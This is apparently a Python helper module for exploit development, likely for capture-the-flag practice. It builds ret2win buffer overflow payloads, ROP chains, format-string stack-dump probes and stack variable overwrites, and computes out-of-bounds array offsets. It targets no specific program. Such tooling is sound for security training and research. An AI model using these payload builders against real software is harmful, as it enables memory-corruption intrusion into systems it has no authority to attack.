from __future__ import annotations

import struct


def build_ret2win_payload(padding_len: int, win_addr: int, arch: str = "x64") -> bytes:
    """Construct classic buffer overflow ret2win payload overwriting saved RIP/EIP."""
    pad = b"A" * padding_len
    fmt = "<Q" if arch == "x64" else "<I"
    return pad + struct.pack(fmt, win_addr)


def build_rop_chain(padding_len: int, gadgets: list[int], arch: str = "x64") -> bytes:
    """Construct ROP chain payload packing sequential 64-bit or 32-bit addresses."""
    pad = b"A" * padding_len
    fmt = "<Q" if arch == "x64" else "<I"
    chain = b"".join(struct.pack(fmt, g) for g in gadgets)
    return pad + chain


def build_format_string_probe(num_words: int = 10, offset_start: int = 1) -> str:
    """Generate positional format string probes to dump stack memory (%1$p.%2$p...)."""
    return ".".join(f"%{i}$p" for i in range(offset_start, offset_start + num_words))


def build_variable_overwrite(padding_len: int, target_val: int, arch: str = "x32") -> bytes:
    """Construct payload overwriting adjacent stack control/gate variable."""
    pad = b"A" * padding_len
    fmt = "<I" if arch == "x32" else "<Q"
    return pad + struct.pack(fmt, target_val)


def calculate_oob_offset(element_size: int, target_distance_bytes: int) -> int:
    """Calculate out-of-bounds array index given element size and distance."""
    if element_size <= 0:
        raise ValueError("Element size must be positive")
    return target_distance_bytes // element_size
